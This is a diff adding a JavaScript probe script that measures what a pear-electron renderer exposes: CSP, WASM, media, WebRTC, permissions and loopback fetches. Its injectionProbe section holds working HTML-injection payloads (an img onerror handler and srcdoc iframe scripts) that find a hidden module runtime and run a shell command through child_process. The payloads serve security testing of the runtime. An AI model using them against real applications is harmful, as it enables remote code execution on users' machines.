@@ -1,0 +1,317 @@
+// S1 renderer probe for a pre-v3 pear-electron runtime. Collects what Chromium offers, asks the
+// Bare side for its loopback port over the pipe, tries <video> and MSE against that port, and
+// sends one results object back as a newline-terminated JSON line.
+const R = { started: Date.now() }
+const BEACON = 'http://127.0.0.1:47199' // index.js: a loopback channel that does not need the pipe
+const beacon = (stage, data = {}) => {
+  try { fetch(BEACON + '/b?' + encodeURIComponent(JSON.stringify({ stage, t: Date.now() - R.started, ...data })), { mode: 'no-cors' }).catch(() => {}) } catch {}
+}
+beacon('module-start')
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
+const err = (e) => String((e && (e.name ? e.name + ': ' : '') + (e.message || e)) || e)
+function timeout (p, ms, what) {
+  return Promise.race([p, sleep(ms).then(() => { throw new Error('timeout: ' + what) })])
+}
+const status = (s) => { const el = document.getElementById('status'); if (el) el.textContent = s }
+
+async function getPipe () {
+  try {
+    const m = await timeout(import('pear-pipe'), 5000, "import('pear-pipe')")
+    beacon('pipe-imported', { keys: Object.keys(m).slice(0, 5) })
+    const p = (m.default || m)()
+    if (p) return { pipe: p, via: "import('pear-pipe')" }
+  } catch (e) {
+    R.pearPipeImportError = err(e)
+  }
+  try {
+    if (typeof require === 'function') {
+      const p = require('pear-pipe')()
+      if (p) return { pipe: p, via: "require('pear-pipe')" }
+    }
+  } catch (e) {
+    R.pearPipeRequireError = err(e)
+  }
+  const P = globalThis.Pear
+  const ipc = P && P[P.constructor.IPC]
+  if (ipc && typeof ipc.pipe === 'function') return { pipe: ipc.pipe(), via: 'Pear[Pear.constructor.IPC].pipe()' }
+  return { pipe: null, via: null }
+}
+
+function runtimeInfo () {
+  const ua = navigator.userAgent
+  R.userAgent = ua
+  R.uaChrome = (/Chrome\/([\d.]+)/.exec(ua) || [])[1] || null
+  R.uaElectron = (/Electron\/([\d.]+)/.exec(ua) || [])[1] || null
+  R.typeofRequire = typeof require
+  R.typeofProcess = typeof process
+  if (typeof process !== 'undefined') {
+    R.processVersions = { electron: process.versions.electron, chrome: process.versions.chrome, node: process.versions.node, v8: process.versions.v8 }
+    R.processType = process.type
+    R.processSandboxed = process.sandboxed
+    R.processContextIsolated = process.contextIsolated
+    R.rendererArgvHasNoSandbox = Array.isArray(process.argv) ? process.argv.includes('--no-sandbox') : null
+    // Exact flags only: one argv entry is a JSON blob holding the app's whole environment.
+    R.rendererArgvSandboxFlags = Array.isArray(process.argv) ? process.argv.filter((a) => /^--[a-z-]*sandbox[a-z-]*$/.test(a)) : null
+  }
+  R.location = location.protocol + '//' + location.hostname + ':(port)' + location.pathname
+  R.isSecureContext = window.isSecureContext
+  R.crossOriginIsolated = window.crossOriginIsolated
+  R.typeofPear = typeof globalThis.Pear
+}
+
+async function cspProbe () {
+  const meta = document.querySelector('meta[http-equiv="Content-Security-Policy" i]')
+  R.cspMeta = meta ? meta.getAttribute('content') : null
+  try {
+    const res = await timeout(fetch(location.href), 5000, 'self fetch')
+    R.selfStatus = res.status
+    R.selfHeaders = [...res.headers.keys()]
+    R.cspHeader = res.headers.get('content-security-policy')
+  } catch (e) { R.selfFetchError = err(e) }
+  try { R.evalWorks = eval('1 + 1') === 2 } catch (e) { R.evalWorks = err(e) }
+  try { R.newFunctionWorks = new Function('return 42')() === 42 } catch (e) { R.newFunctionWorks = err(e) } // eslint-disable-line no-new-func
+  try {
+    const s = document.createElement('script')
+    s.textContent = 'window.__s1Inline = 1'
+    document.head.appendChild(s)
+    R.inlineScriptRuns = window.__s1Inline === 1
+  } catch (e) { R.inlineScriptRuns = err(e) }
+}
+
+async function wasmProbe () {
+  R.typeofWebAssembly = typeof WebAssembly
+  if (typeof WebAssembly === 'undefined') return
+  const empty = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00])
+  R.wasmValidateEmpty = WebAssembly.validate(empty)
+  // (module (func (export "f") (result i32) i32.const 42))
+  const f42 = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x05, 0x01, 0x01, 0x66, 0x00, 0x00, 0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b])
+  R.wasmValidateF42 = WebAssembly.validate(f42)
+  try {
+    const { instance } = await WebAssembly.instantiate(f42)
+    R.wasmInstantiateF42 = instance.exports.f()
+  } catch (e) { R.wasmInstantiateF42 = err(e) }
+}
+
+function mseProbe () {
+  R.typeofMediaSource = typeof MediaSource
+  R.typeofManagedMediaSource = typeof globalThis.ManagedMediaSource
+  if (typeof MediaSource === 'undefined') return
+  R.mseSupported = {}
+  for (const t of ['video/mp4; codecs="avc1.64001f,mp4a.40.2"', 'video/mp4; codecs="avc1.42E01E"', 'audio/mp4; codecs="mp4a.40.2"', 'video/webm; codecs="vp9,opus"', 'video/mp4; codecs="hvc1.1.6.L93.B0"']) {
+    R.mseSupported[t] = MediaSource.isTypeSupported(t)
+  }
+}
+
+async function webrtcProbe () {
+  R.typeofRTCPeerConnection = typeof RTCPeerConnection
+  if (typeof RTCPeerConnection === 'undefined') return
+  const pc1 = new RTCPeerConnection()
+  const pc2 = new RTCPeerConnection()
+  const cands = []
+  try {
+    pc1.onicecandidate = (e) => { if (e.candidate) { cands.push(e.candidate.candidate); pc2.addIceCandidate(e.candidate).catch(() => {}) } }
+    pc2.onicecandidate = (e) => { if (e.candidate) pc1.addIceCandidate(e.candidate).catch(() => {}) }
+    const dc = pc1.createDataChannel('s1')
+    const got = new Promise((resolve) => { pc2.ondatachannel = (e) => { e.channel.onmessage = (m) => resolve(m.data) } })
+    const opened = new Promise((resolve) => { dc.onopen = resolve })
+    const offer = await pc1.createOffer()
+    R.webrtcOfferHasSdp = typeof offer.sdp === 'string' && offer.sdp.startsWith('v=0')
+    await pc1.setLocalDescription(offer)
+    await pc2.setRemoteDescription(offer)
+    const answer = await pc2.createAnswer()
+    await pc2.setLocalDescription(answer)
+    await pc1.setRemoteDescription(answer)
+    await timeout(opened, 10000, 'datachannel open')
+    dc.send('ping')
+    R.webrtcLocalDataChannel = await timeout(got, 5000, 'datachannel message')
+  } catch (e) {
+    R.webrtcLocalDataChannel = err(e)
+  } finally {
+    R.webrtcCandidateKinds = cands.map((c) => {
+      const p = c.split(' ')
+      const addr = p[4] || ''
+      return p[2] + '/' + p[7] + '/' + (addr.endsWith('.local') ? 'mdns' : addr.includes(':') ? 'ipv6' : 'ipv4')
+    })
+    pc1.close()
+    pc2.close()
+  }
+}
+
+function waitVideo (v, ms) {
+  return new Promise((resolve) => {
+    const t = setTimeout(() => resolve({ event: 'timeout' }), ms)
+    v.addEventListener('loadedmetadata', () => { clearTimeout(t); resolve({ event: 'loadedmetadata' }) }, { once: true })
+    v.addEventListener('error', () => { clearTimeout(t); resolve({ event: 'error', code: v.error && v.error.code, message: v.error && v.error.message }) }, { once: true })
+  })
+}
+
+async function videoProbe (port) {
+  const v1 = document.getElementById('v1')
+  v1.src = `http://127.0.0.1:${port}/x.mp4`
+  const r1 = await waitVideo(v1, 20000)
+  R.video127 = { ...r1, readyState: v1.readyState, duration: v1.duration, width: v1.videoWidth, height: v1.videoHeight }
+  if (r1.event === 'loadedmetadata') {
+    try {
+      await timeout(v1.play(), 5000, 'play')
+      await sleep(1500)
+      R.video127.playedTo = v1.currentTime
+    } catch (e) { R.video127.play = err(e) }
+  }
+  const v2 = document.getElementById('v2')
+  v2.src = `http://localhost:${port}/x.mp4`
+  const r2 = await waitVideo(v2, 10000)
+  R.videoLocalhostOtherPort = { ...r2, readyState: v2.readyState }
+}
+
+async function fetchProbes (port) {
+  try {
+    const res = await timeout(fetch(`http://127.0.0.1:${port}/x.mp4`, { headers: { Range: 'bytes=0-15' } }), 5000, 'fetch 127')
+    R.fetch127 = { status: res.status, contentRange: res.headers.get('content-range') }
+  } catch (e) { R.fetch127 = err(e) }
+  try {
+    const res = await timeout(fetch(`http://localhost:${port}/x.mp4`), 5000, 'fetch localhost')
+    R.fetchLocalhostOtherPort = { status: res.status }
+  } catch (e) { R.fetchLocalhostOtherPort = err(e) }
+  try {
+    const res = await timeout(fetch('https://example.com/'), 8000, 'fetch https')
+    R.fetchExternalHttps = { status: res.status }
+  } catch (e) { R.fetchExternalHttps = err(e) }
+  R.webSocketWss = await new Promise((resolve) => {
+    let ws
+    const t = setTimeout(() => { try { ws.close() } catch {} resolve('timeout') }, 10000)
+    try {
+      ws = new WebSocket('wss://relay.damus.io')
+      ws.onopen = () => { clearTimeout(t); ws.close(); resolve('open') }
+      ws.onerror = () => { clearTimeout(t); resolve('error') }
+    } catch (e) { clearTimeout(t); resolve(err(e)) }
+  })
+}
+
+async function mseAppendProbe (port) {
+  if (typeof MediaSource === 'undefined') return
+  try {
+    const buf = await (await fetch(`http://127.0.0.1:${port}/x.mp4`)).arrayBuffer()
+    const ms = new MediaSource()
+    const v = document.createElement('video')
+    v.muted = true
+    document.body.appendChild(v)
+    v.src = URL.createObjectURL(ms)
+    await timeout(new Promise((resolve) => ms.addEventListener('sourceopen', resolve, { once: true })), 5000, 'sourceopen')
+    const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.64001f,mp4a.40.2"')
+    await timeout(new Promise((resolve, reject) => {
+      sb.addEventListener('updateend', resolve, { once: true })
+      sb.addEventListener('error', () => reject(new Error('sourcebuffer error')), { once: true })
+      sb.appendBuffer(buf)
+    }), 10000, 'appendBuffer')
+    const ranges = []
+    for (let i = 0; i < sb.buffered.length; i++) ranges.push([sb.buffered.start(i), sb.buffered.end(i)])
+    R.mseAppend = { bytes: buf.byteLength, buffered: ranges }
+  } catch (e) { R.mseAppend = err(e) }
+}
+
+async function permissionProbe () {
+  // No permission handlers are set in the main process: what does a page get without asking?
+  try { R.notificationRequest = await timeout(Notification.requestPermission(), 5000, 'notification') } catch (e) { R.notificationRequest = err(e) }
+  try { R.permissionsQueryNotifications = (await navigator.permissions.query({ name: 'notifications' })).state } catch (e) { R.permissionsQueryNotifications = err(e) }
+  try {
+    const s = await timeout(navigator.mediaDevices.getUserMedia({ audio: true }), 5000, 'getUserMedia')
+    R.getUserMediaAudio = 'granted, tracks ' + s.getTracks().length
+    s.getTracks().forEach((t) => t.stop())
+  } catch (e) { R.getUserMediaAudio = err(e) } // NotFoundError = allowed but no device; NotAllowedError = denied
+  try { R.clipboardReadText = typeof (await timeout(navigator.clipboard.readText(), 5000, 'clipboard')) } catch (e) { R.clipboardReadText = err(e) }
+}
+
+// What an HTML injection reaches: the shape of a Nostr note, a profile field or a video title that
+// an app renders with innerHTML. The preload deletes window.require, but script-linker's runtime
+// stays on a global symbol with a require of its own. Each payload is self-contained, as an
+// attacker's would be, and runs `id` through child_process if it can reach it. Harmless in the VM.
+const FIND = (w) => "Object.getOwnPropertySymbols(" + w + ").map(function(k){return " + w + "[k]}).find(function(v){return v&&typeof v.require==='function'})"
+const PAYLOAD = "var r;try{var s=" + FIND('window') + ";r=s?'module runtime: '+s.require('child_process').execFileSync('id',{encoding:'utf8'}).trim():'no module runtime on window'}catch(e){r='threw '+e.name+': '+e.message}"
+const FRAME_SCRIPT = (tag) => "<script>var own=typeof require;var r;try{var s=" + FIND('parent') + ";r=s?'parent module runtime: '+s.require('child_process').execFileSync('id',{encoding:'utf8'}).trim():'no module runtime on parent'}catch(e){r='threw '+e.name+': '+e.message}" +
+  "parent.postMessage({s1frame:'" + tag + "',ownRequire:own,result:r,origin:String(location.origin)},'*')</script>"
+
+async function injectionProbe () {
+  const host = document.createElement('div')
+  document.body.appendChild(host)
+  host.innerHTML = '<img src="data:image/png;base64,AA==" onerror="' + PAYLOAD.replace(/"/g, '&quot;') + ';window.__s1inj=r">'
+  await sleep(1000)
+  R.injectionInnerHtmlImgOnerror = window.__s1inj === undefined ? 'handler did not run' : window.__s1inj
+
+  const frames = {}
+  const onMsg = (e) => { if (e.data && e.data.s1frame) frames[e.data.s1frame] = { ownRequire: e.data.ownRequire, result: e.data.result, origin: e.data.origin } }
+  window.addEventListener('message', onMsg)
+  for (const [tag, sandbox] of [['srcdoc-same-origin', null], ['srcdoc-sandbox-allow-scripts', 'allow-scripts']]) {
+    const f = document.createElement('iframe')
+    if (sandbox !== null) f.setAttribute('sandbox', sandbox)
+    f.srcdoc = FRAME_SCRIPT(tag)
+    document.body.appendChild(f)
+  }
+  // Can the app impose a CSP itself? The bridge sends none, but a page may carry a <meta> one. This
+  // frame has default-src 'none' and two inline payloads; silence means the CSP blocked both.
+  const csp = document.createElement('iframe')
+  csp.srcdoc = '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'">' +
+    '<img src="data:image/png;base64,AA==" onerror="parent.postMessage({s1frame:\'meta-csp-onerror\',result:\'inline handler ran\'},\'*\')">' +
+    "<script>parent.postMessage({s1frame:'meta-csp-script',result:'inline script ran'},'*')</script>"
+  document.body.appendChild(csp)
+  await sleep(3000)
+  window.removeEventListener('message', onMsg)
+  for (const tag of ['srcdoc-same-origin', 'srcdoc-sandbox-allow-scripts', 'meta-csp-onerror', 'meta-csp-script']) {
+    if (!(tag in frames)) frames[tag] = 'no message in 3 s'
+  }
+  R.injectionIframes = frames
+}
+
+async function pipeProbe () {
+  beacon('pipe-try')
+  const { pipe, via } = await getPipe()
+  beacon('pipe', { via, importError: R.pearPipeImportError, requireError: R.pearPipeRequireError })
+  if (!pipe) return
+  let buffered = ''
+  const reply = new Promise((resolve) => {
+    pipe.on('data', (data) => {
+      R.pipeChunkFromBare = { type: data && data.constructor && data.constructor.name, isString: typeof data === 'string', bytes: data && (data.byteLength ?? data.length) }
+      buffered += typeof data === 'string' ? data : new TextDecoder().decode(data)
+      const nl = buffered.indexOf('\n')
+      if (nl !== -1) resolve(JSON.parse(buffered.slice(0, nl)))
+    })
+  })
+  pipe.on('error', (e) => beacon('pipe-error', { e: err(e) }))
+  pipe.write(JSON.stringify({ type: 'hello', sent: Date.now() }) + '\n')
+  beacon('pipe-hello-written')
+  try {
+    const c = await timeout(reply, 8000, 'reply from Bare over the pipe')
+    beacon('pipe-roundtrip', { chunk: R.pipeChunkFromBare, replyType: c.type, videoPortMatches: typeof c.videoPort === 'number' })
+  } catch (e) { beacon('pipe-no-reply', { e: err(e) }) }
+}
+
+async function main () {
+  status('probing')
+  runtimeInfo()
+  beacon('runtime-info', { uaElectron: R.uaElectron, uaChrome: R.uaChrome, typeofRequire: R.typeofRequire, typeofPear: R.typeofPear })
+  let port = null
+  try {
+    port = (await (await timeout(fetch(BEACON + '/config'), 5000, 'beacon config')).json()).videoPort
+    R.configVia = 'beacon'
+  } catch (e) { R.beaconConfig = err(e) }
+  beacon('config', { port })
+  for (const [name, fn] of [['csp', cspProbe], ['wasm', wasmProbe], ['mse', mseProbe], ['webrtc', webrtcProbe], ['permission', permissionProbe], ['injection', injectionProbe]]) {
+    beacon('probe ' + name)
+    try { await fn() } catch (e) { R[name + 'ProbeError'] = err(e) }
+  }
+  if (port) {
+    for (const [name, fn] of [['video', videoProbe], ['fetch', fetchProbes], ['mseAppend', mseAppendProbe]]) {
+      beacon('probe ' + name)
+      try { await fn(port) } catch (e) { R[name + 'ProbeError'] = err(e) }
+    }
+  }
+  R.finished = Date.now() - R.started
+  // Results go out before the pipe is touched: an earlier run stopped for good inside getPipe().
+  try {
+    await timeout(fetch(BEACON + '/results', { method: 'POST', mode: 'no-cors', body: JSON.stringify(R) }), 5000, 'results post')
+  } catch (e) { beacon('results-post-error', { e: err(e) }) }
+  status('results sent')
+  await pipeProbe()
+  status('done')
+}
+
+main().catch((e) => { beacon('main-error', { e: err(e), stack: String(e && e.stack).slice(0, 800) }); console.log('S1R ' + JSON.stringify({ fatal: err(e) })) })
